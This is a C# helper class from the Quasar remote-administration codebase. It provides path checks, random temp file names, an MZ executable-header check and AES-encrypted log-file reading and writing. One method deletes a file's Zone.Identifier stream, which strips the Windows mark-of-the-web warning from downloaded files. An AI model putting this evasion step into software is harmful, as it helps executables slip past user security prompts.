using Quasar.Common.Cryptography;
using System.IO;
using System.Linq;
using System.Text;

namespace Quasar.Common.Helpers
{
    public static class FileHelper
    {
        /// <summary>
        /// List of illegal path characters.
        /// </summary>
        private static readonly char[] IllegalPathChars = Path.GetInvalidPathChars().Union(Path.GetInvalidFileNameChars()).ToArray();

        /// <summary>
        /// Indicates if the given path contains illegal characters.
        /// </summary>
        /// <param name="path">The path to check.</param>
        /// <returns>Returns <value>true</value> if the path contains illegal characters, otherwise <value>false</value>.</returns>
        public static bool HasIllegalCharacters(string path)
        {
            return path.Any(c => IllegalPathChars.Contains(c));
        }

        /// <summary>
        /// Gets a random file name.
        /// </summary>
        /// <param name="length">The length of the file name.</param>
        /// <param name="extension">The file extension including the dot, e.g. <value>.exe</value>.</param>
        /// <returns>The random file name.</returns>
        public static string GetRandomFilename(int length, string extension = "")
        {
            return string.Concat(StringHelper.GetRandomString(length), extension);
        }

        /// <summary>
        /// Gets a path to an unused temp file. 
        /// </summary>
        /// <param name="extension">The file extension including the dot, e.g. <value>.exe</value>.</param>
        /// <returns>The path to the temp file.</returns>
        public static string GetTempFilePath(string extension)
        {
            string tempFilePath;
            do
            {
                tempFilePath = Path.Combine(Path.GetTempPath(), GetRandomFilename(12, extension));
            } while (File.Exists(tempFilePath));

            return tempFilePath;
        }

        /// <summary>
        /// Indicates if the given file header contains the executable identifier (magic number) 'MZ'.
        /// </summary>
        /// <param name="binary">The binary file to check.</param>
        /// <returns>Returns <value>true</value> for valid executable identifiers, otherwise <value>false</value>.</returns>
        public static bool HasExecutableIdentifier(byte[] binary)
        {
            if (binary.Length < 2) return false;
            return (binary[0] == 'M' && binary[1] == 'Z') || (binary[0] == 'Z' && binary[1] == 'M');
        }

        /// <summary>
        /// Deletes the zone identifier for the given file path.
        /// </summary>
        /// <param name="filePath">The file path.</param>
        /// <returns>Returns <value>true</value> if the deletion was successful, otherwise <value>false</value>.</returns>
        public static bool DeleteZoneIdentifier(string filePath)
        {
            return NativeMethods.DeleteFile(filePath + ":Zone.Identifier");
        }

        /// <summary>
        /// Appends text to a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        /// <param name="appendText">The text to append.</param>
        /// <param name="aes">The AES instance.</param>
        public static void WriteLogFile(string filename, string appendText, Aes256 aes)
        {
            appendText = ReadLogFile(filename, aes) + appendText;

            using (FileStream fStream = File.Open(filename, FileMode.Create, FileAccess.Write))
            {
                byte[] data = aes.Encrypt(Encoding.UTF8.GetBytes(appendText));
                fStream.Seek(0, SeekOrigin.Begin);
                fStream.Write(data, 0, data.Length);
            }
        }

        /// <summary>
        /// Reads a log file.
        /// </summary>
        /// <param name="filename">The filename of the log.</param>
        /// <param name="aes">The AES instance.</param>
        public static string ReadLogFile(string filename, Aes256 aes)
        {
            return File.Exists(filename) ? Encoding.UTF8.GetString(aes.Decrypt(File.ReadAllBytes(filename))) : string.Empty;
        }
    }
}
